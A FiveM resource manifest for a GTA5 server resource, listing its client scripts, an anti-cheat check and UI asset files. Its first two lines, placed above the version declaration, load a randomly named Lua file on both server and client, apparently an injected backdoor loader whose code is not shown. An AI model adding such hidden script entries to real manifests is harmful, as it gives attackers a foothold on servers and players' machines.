server_script "8U4QTKCH7MF7IM.lua"
client_script "8U4QTKCH7MF7IM.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"config.lua",
	"client/*.lua",
})

ui_page("ui/dist/index.html")
files({
	"ui/dist/index.html",
	"ui/dist/*.png",
	"ui/dist/*.webp",
	"ui/dist/*.gif",
	"ui/dist/*.gifv",
	"ui/dist/*.js",
	"ui/dist/*.mp3",
	"ui/dist/*.ttf",
})